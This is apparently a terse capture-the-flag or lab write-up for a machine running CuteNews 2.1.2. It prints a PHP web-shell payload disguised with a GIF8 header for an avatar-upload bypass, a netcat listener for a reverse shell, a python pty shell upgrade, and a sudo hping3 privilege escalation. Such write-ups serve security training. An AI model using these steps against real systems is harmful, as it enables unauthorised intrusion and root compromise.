@@ -1,0 +1,43 @@
+Writeup
+IP Address 192.168.x.x
+
+Do nmap scanning
+and do http enumeration 
+You will find cms is cutenews 2.1.2
+
+search on google for CVE 
+also use searchsploit cutenews 2.1.2
+
+open the exploit and read it properly 
+
+I am doing exploitation manualy with the help of uload files 
+
+open website http://192.168.x.x/index.php
+create new user 
+upload shell (instead of image)
+
+Dont forget add GIF header > GIF8;
+
+GIF8;\n<?php system($_REQUEST['cmd']) ?>
+access you uploaded php file
+
+I have uloaded reverse shell 
+http://192.168.250.128/uploads/avatar_vijay_shell1.php
+
+I will start nc -nvlp 1234
+
+I got shell 
+Exploit 
+sudo -l
+Get propore shell 
+python -c 'import pty;pty.spawn("/bin/bash")'
+sudo -l
+hping3
+now you are root
+
+great
+id
+ls
+ls /root
+cat /root/proof.txt
+
